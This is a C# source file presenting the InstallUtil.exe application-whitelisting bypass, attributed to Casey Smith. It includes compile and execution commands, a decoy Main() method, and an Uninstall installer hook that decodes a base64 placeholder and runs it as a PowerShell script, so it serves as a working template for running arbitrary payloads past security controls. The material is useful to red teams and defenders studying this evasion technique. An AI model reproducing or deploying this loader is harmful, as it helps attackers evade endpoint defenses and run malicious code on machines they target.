using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.IO;
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:exeshell.exe Shellcode.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
(Or)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().
	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.
	We believe the root issue here is:
	
	The root issue here with Assembly.Load() is that at the point at which execute operations are detected 
	(CreateFileMapping->NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  
	Later, execute access is requested in the file mapping (MapViewOfFile->NtMapViewOfSection), 
	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.
	
	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.
	Its not really an exploit, but just a creative way to launch an exe/assembly.
*/


public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
    }

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        PowerShell.DoIt();

    }

}

public class PowerShell
{
    public static bool DoIt()
    {
        string encCommand = "!INSERTCODEHERE!";

        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke rInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();
        //Decode the base64 encoded command
        byte[] data = Convert.FromBase64String(encCommand);
        string command = Encoding.ASCII.GetString(data);
        pipeline.Commands.AddScript(command);
        pipeline.Invoke();
        runspace.Close();

        return true;
    }
}